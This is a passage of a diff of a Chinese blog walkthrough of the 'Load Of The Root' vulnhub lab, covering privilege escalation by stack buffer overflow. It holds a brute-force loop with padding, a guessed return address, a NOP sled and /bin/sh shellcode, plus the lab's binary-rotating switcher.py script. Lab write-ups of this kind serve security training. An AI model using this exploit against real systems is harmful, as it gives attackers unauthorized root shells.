-#for a in &#123;1..1000&#125;; do ./file $(python -c &#39;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;); done
-shell=buf+&quot;\x40\xee\xff\xbf&quot;+&quot;C&quot;*20000+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
-for i in range(1,500):
-        os.system(&#39;./file&#39;+&quot; &quot;+shell)
-</code></pre>
 <p>由于esp地址前两位一直是bf所以我们前两位不变，剩下六位随便填，不要填\x00就行，他有特殊含义不能被正确识别</p>
 <p>代码中被注释的是我从其他作者文章中复制过来的，可以直接在shell中执行</p>
 <p>执行命令</p>
-<pre><code>#for a in &#123;1..1000&#125;; do ./file $(python -c &#39;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#39;); done
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240428163407372.png" alt="image-20240428163407372"></p>
 <p>终于成了。。。。</p>
 <p>这里有个问题是，root目录下有个switcher.py文件，会让产生缓冲区溢出的文件发生变化</p>
-<pre><code>#!/usr/bin/python
-import os
-from random import randint
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import os</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">targets= [&quot;/SECRET/door1/&quot;,&quot;/SECRET/door2/&quot;,&quot;/SECRET/door3/&quot;]</span><br><span class="line">for t in targets:</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">   os.system(&quot;cp -p other &quot;+t)</span><br><span class="line">   os.system(&quot;cp -p &quot;+t+&quot;other &quot;+t+&quot;file&quot;)</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;other&quot;)</span><br><span class="line"></span><br><span class="line">luckyDoor = randint(0,2)</span><br><span class="line">t=targets[luckyDoor]</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">os.system(&quot;cp -p buf &quot;+t)</span><br><span class="line">os.system(&quot;cp -p &quot;+t+&quot;buf &quot;+t+&quot;file&quot;)</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;buf&quot;)</span><br></pre></td></tr></table></figure>
 
-targets= [&quot;/SECRET/door1/&quot;,&quot;/SECRET/door2/&quot;,&quot;/SECRET/door3/&quot;]
-for t in targets:
-   os.system(&quot;rm &quot;+t+&quot;*&quot;)
-   os.system(&quot;cp -p other &quot;+t)
-   os.system(&quot;cp -p &quot;+t+&quot;other &quot;+t+&quot;file&quot;)
-   os.system(&quot;rm &quot;+t+&quot;other&quot;)
-
-luckyDoor = randint(0,2)
-t=targets[luckyDoor]
-os.system(&quot;rm &quot;+t+&quot;*&quot;)
-os.system(&quot;cp -p buf &quot;+t)
-os.system(&quot;cp -p &quot;+t+&quot;buf &quot;+t+&quot;file&quot;)
-os.system(&quot;rm &quot;+t+&quot;buf&quot;)
-</code></pre>
 <p>有时候不行的话，可以回去看下存在溢出的文件有没有发生变化</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/26/Load-Of-The-Root/">http://example.com/2024/04/26/Load-Of-The-Root/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/vulhub/">vulhub</a><a class="post-meta__tags" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a><a class="post-meta__tags" href="/tags/udf%E6%8F%90%E6%9D%83/">udf提权</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/OSCP-003-Troll/" title="OSCP-003-Troll"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">OSCP-003-Troll</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/18/php-SER-libs/" title="php反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Ai-web1通关记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">Ai-web1通关记录</div></div></a></div><div><a href="/2024/03/20/DC-2/" title="DC-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-2</div></div></a></div><div><a href="/2024/04/10/DC-3/" title="DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-10</div><div class="title">DC-3</div></div></a></div><div><a href="/2024/03/20/DC-1/" title="DC-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-1</div></div></a></div><div><a href="/2023/07/21/DVWA/" title="DVWA low"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-21</div><div class="title">DVWA low</div></div></a></div><div><a href="/2024/04/07/DarkHole/" title="DarkHole"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-07</div><div class="title">DarkHole</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/youzipii"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Load-Of-The-Root%E5%8F%82%E8%80%83"><span class="toc-text">Load Of The Root参考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">ssh远程连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-text">访问端口服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E5%8F%9639166-c"><span class="toc-text">利用内核漏洞提取39166.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95-%E4%BD%BF%E7%94%A8mysql%E6%8F%90%E6%9D%83"><span class="toc-text">另一种方法:使用mysql提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-text">法三：缓冲区溢出提权.</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/13/%E7%BA%A2%E6%97%A5-day1/" title="红日-day1">红日-day1</a><time datetime="2024-08-13T09:09:24.000Z" title="发表于 2024-08-13 17:09:24">2024-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/12/DC-4/" title="DC-4">DC-4</a><time datetime="2024-08-12T08:46:53.905Z" title="发表于 2024-08-12 16:46:53">2024-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/" title="shiro-550-环境">shiro-550-环境</a><time datetime="2024-08-11T10:56:40.000Z" title="发表于 2024-08-11 18:56:40">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/pikachu/" title="pikachu">pikachu</a><time datetime="2024-08-11T02:45:29.000Z" title="发表于 2024-08-11 10:45:29">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-tomcat/" title="vulhub-tomcat">vulhub-tomcat</a><time datetime="2024-08-11T02:44:16.000Z" title="发表于 2024-08-11 10:44:16">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/bk_image/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/26/Load-Of-The-Root/">http://example.com/2024/04/26/Load-Of-The-Root/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/vulhub/">vulhub</a><a class="post-meta__tags" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a><a class="post-meta__tags" href="/tags/udf%E6%8F%90%E6%9D%83/">udf提权</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/OSCP-003-Troll/" title="OSCP-003-Troll"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">OSCP-003-Troll</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/18/php-SER-libs/" title="php反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Ai-web1通关记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">Ai-web1通关记录</div></div></a></div><div><a href="/2024/03/20/DC-1/" title="DC-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-1</div></div></a></div><div><a href="/2024/03/20/DC-2/" title="DC-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">DC-2</div></div></a></div><div><a href="/2024/04/10/DC-3/" title="DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-10</div><div class="title">DC-3</div></div></a></div><div><a href="/2023/07/21/DVWA/" title="DVWA low"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-21</div><div class="title">DVWA low</div></div></a></div><div><a href="/2024/04/07/DarkHole/" title="DarkHole"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-07</div><div class="title">DarkHole</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/youzipii"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Load-Of-The-Root%E5%8F%82%E8%80%83"><span class="toc-text">Load Of The Root参考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">ssh远程连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-text">访问端口服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E5%8F%9639166-c"><span class="toc-text">利用内核漏洞提取39166.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95-%E4%BD%BF%E7%94%A8mysql%E6%8F%90%E6%9D%83"><span class="toc-text">另一种方法:使用mysql提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-text">法三：缓冲区溢出提权.</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/13/%E7%BA%A2%E6%97%A5-day1/" title="红日-day1">红日-day1</a><time datetime="2024-08-13T09:09:24.000Z" title="发表于 2024-08-13 17:09:24">2024-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/12/DC-4/" title="DC-4">DC-4</a><time datetime="2024-08-12T08:46:53.905Z" title="发表于 2024-08-12 16:46:53">2024-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/" title="shiro-550-环境">shiro-550-环境</a><time datetime="2024-08-11T10:56:40.000Z" title="发表于 2024-08-11 18:56:40">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/pikachu/" title="pikachu">pikachu</a><time datetime="2024-08-11T02:45:29.000Z" title="发表于 2024-08-11 10:45:29">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-tomcat/" title="vulhub-tomcat">vulhub-tomcat</a><time datetime="2024-08-11T02:44:16.000Z" title="发表于 2024-08-11 10:44:16">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/bk_image/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
